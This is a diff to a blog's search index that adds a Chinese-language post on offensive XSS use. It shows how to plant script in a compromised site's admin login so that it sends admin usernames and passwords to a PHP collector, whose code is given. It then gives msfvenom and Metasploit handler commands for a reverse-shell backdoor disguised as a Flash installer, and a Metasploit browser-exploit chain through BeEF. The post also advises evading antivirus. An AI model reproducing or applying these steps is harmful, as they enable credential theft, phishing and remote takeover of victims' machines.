@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>WEB攻防-通用漏洞—XSS跨站之权限维持、钓鱼</title>
+      <link href="/post/abd6100.html"/>
+      <url>/post/abd6100.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="XSS后台植入Cookie-amp-表单劫持"><a href="#XSS后台植入Cookie-amp-表单劫持" class="headerlink" title="XSS后台植入Cookie&amp;表单劫持"></a>XSS后台植入Cookie&amp;表单劫持</h1><p><strong>前提条件：已经取得了web权限，我们可以直接在代码中写入XSS语句</strong></p><p>有人可能会奇怪，为什么取得了web权限还要写入XSS，是因为我们要对后台的权限进行长期的控制（权限维持），我们可以通过借助XSS盗取cookie，利用xss平台实时监控cookie等凭据进行权限维持，即使修改后台登录账号密码，我们也可以获得相关权限，同时不会被后门工具识别。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807162936300.png" alt="image-20240807162936300"></p><p>当我们进入到页面后，我们可以在xss平台上接收到相关的cookie信息，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172504480-1816928231.png" alt="1645930438846-51b01966-10c6-48fe-a3b8-3b95087c9755.png"></p><p>但是，有时候我们窃取了cookie也不能实现成功登录，因为对方可能采取的不是cookie来进行身份鉴别，而是使用sessionid来实现身份鉴别，这时候即使你获取了cookie，也不能实现登录，这个时候我们就要想办法获取到其明文的账号和密码。</p><p>这里我们首先看看其将账号密码发送到哪个文件中，我们通过浏览器抓包可以发现，账号密码被送入<code>login_check.php</code>中</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172503193-259714763.png" alt="1645931769293-0668f567-0b99-4edc-9c95-e60cbea30cc5.png"></p><p>我们先随便输入一个账号密码，查看提交的数据，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172504016-1501658563.png" alt="1645932659164-9f516362-c71f-490a-97ce-8135adcc8153.png"></p><p>我们再次观察<code>login_check.php</code>，可以发现<code>login_check.php</code>通过<code>$metinfo_admin_name</code>接收账号，通过<code>$metinfo_admin_pass</code>接收密码，然后通过JavaScript语句进行账号密码的发送。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172505591-1439970201.png" alt="1645932798875-2d6dc940-faee-46e0-9ff3-acedf40c94f6.png"></p><p>我们如何进行表单的劫持呢？我们首先可以通过JavaScript语句将账号密码发送到别的地方，通过构造<code>&lt;script src=&quot;http://www.xiaodi8.com/get.php?user=&quot;账号&quot;&amp;pass&quot;密码&quot;&quot;&gt;&lt;/script&gt;</code>，紧接着我们写一个php文件实现接收账号密码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$up</span>=<span class="string">&#x27;&lt;script src=http://127.0.0.1:8081/web/get.php?user=&#x27;</span>.<span class="variable">$metinfo_admin_name</span>.<span class="string">&#x27;&amp;pass=&#x27;</span>.<span class="variable">$metinfo_admin_pass</span>.<span class="string">&#x27;&gt;&lt;/script&gt;&#x27;</span>; </span><br></pre></td></tr></table></figure><p>对应的get.php文件如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;newfile.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$u</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$p</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当别人进行成功登录后，就会进入index.php文件中，而这个文件的代码被我们添加了JavaScript代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="attr">http</span>:<span class="comment">//127.0.0.1:8081/web/get.php?user=&#x27;.$metinfo_admin_name.&#x27;&amp;pass=&#x27;.$metinfo_admin_pass.&#x27;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>会自动将信息发送到我们对应的php下进行接收，进而实现表单劫持</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807170006116.png" alt="image-20240807170006116"></p><h1 id="flash钓鱼配合MSF"><a href="#flash钓鱼配合MSF" class="headerlink" title="flash钓鱼配合MSF"></a>flash钓鱼配合MSF</h1><p>我们首先下载一个正常的flash，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807170459099.png" alt="image-20240807170459099"></p><p>我们再通过msf生成一个后门exe，相关代码如下所示</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.153.129 LPORT=1111 -f exe &gt; flash.exe</span><br></pre></td></tr></table></figure><p>其中<code>LHOST</code>为监听端ip地址，<code>LPORT</code>为监听端口</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807170856470.png" alt="image-20240807170856470"></p><p>我们将这个文件传输到我们的本机上来，记得关闭本机杀毒软件，因为我们没做免杀</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807171033289.png" alt="image-20240807171033289"></p><p>我们把两个文件进行捆绑，我们这里通过WinRAR进行两个文件的捆绑，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808145656225.png" alt="image-20240808145656225"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808145816899.png" alt="image-20240808145816899"></p><p>记得先勾选再改名，不然不会是以exe的形式存在的，接着选择高级-自解压选项，添加自解压路径：<code>C:\windows\temp</code></p><p><img src="C:/Users/31677/AppData/Roaming/Typora/typora-user-images/image-20240808150130383.png" alt="image-20240808150130383"></p><p>之后我们设置自解压后运行，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808150648956.png" alt="image-20240808150648956"></p><p>之后我们将模式设置为全部隐藏</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808150803655.png" alt="image-20240808150803655"></p><p>之后我们成功创建自解压文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808150846322.png" alt="image-20240808150846322"></p><p>接下来我们为了更逼真，我们决定将图标进行更换，这里我们使用资源编辑器<code>Restorator2018_Full_1793_FIX</code>进行修改</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808151554232.png" alt="image-20240808151554232"></p><p>我们紧接着将图片进行导出，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808151750896.png" alt="image-20240808151750896"></p><p>然后我们打开我们的<code>flash_install.exe</code>，然后将刚刚的图标导入进去，并且删除其原来的图标，然后保存即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808152631873.png" alt="image-20240808152631873"></p><p>但是不知道为什么，这里把图标替换了，但是没什么反应，但是确实已经被替换了，接下来我们利用一个视频链接，里面插入xss代码自动下载这个文件，就实现了和xss的互动，但是这里过于复杂，还需要进行钓鱼网页的制作，所以就不在此演示</p><p>接着我们开启监听，我们使用win7虚拟机作为受害靶机演示</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line"><span class="built_in">set</span> lport 1111</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808153947849.png" alt="image-20240808153947849"></p><p>我们这里假设已经通过钓鱼软件下载到了相关文件，这里复制到虚拟机上来图标变了，可能是没刷新吧，我们这里直接运行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808154257010.png" alt="image-20240808154257010"></p><p>运行后我们可以发现，已经监听到了相关上钩主机</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808154518913.png" alt="image-20240808154518913"></p><p>我们shell进行获取权限，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808154557666.png" alt="image-20240808154557666"></p><p>如果想要成功率更高一点，就需要我们学习免杀相关内容，防止杀毒软件识别病毒</p><h1 id="XSS-浏览网马配合MSF上线"><a href="#XSS-浏览网马配合MSF上线" class="headerlink" title="XSS-浏览网马配合MSF上线"></a>XSS-浏览网马配合MSF上线</h1><p><strong>前置条件：目标使用带有漏洞的浏览器，为IE11</strong>，漏洞编号为CVE-2019-1367和CVE-2020-1380</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line"><span class="built_in">set</span> allowpowershellprompt <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> target 1 run </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172504924-946401172.png" alt="1646028417415-aeab27a8-1859-40e9-acd7-2ca27853058a.png"></p><p>运行之后会生成一个网址，只要地址一被访问就会被触发，但是只针对Windows7系统</p><p>我们可以通过xss让其上线beef，再通过beef自动跳转到我们构造的网马地址，其一访问就会上线</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172505653-1084962839.png" alt="1646029504625-62dfdad0-9f6c-4568-915e-ea1cc7f69166.png"></p><p>成功完成测试，总之对于xss的利用方式有很多，需要我们自己去发散思维，多多尝试即可。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络攻防 </category>
+          
+          <category> WEB攻防 </category>
+          
+          <category> XSS跨站请求 </category>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 权限维持 </tag>
+            
+            <tag> 表单劫持 </tag>
+            
+            <tag> 钓鱼 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>WEB攻防-通用漏洞-XSS跨站之特殊类型XSS</title>
       <link href="/post/106d471e.html"/>
       <url>/post/106d471e.html</url>
@@ -1384,9 +1419,9 @@
       
         <tags>
             
-            <tag> 加密解密 </tag>
-            
             <tag> Web安全 </tag>
+            
+            <tag> 加密解密 </tag>
             
             <tag> 数据库 </tag>
             
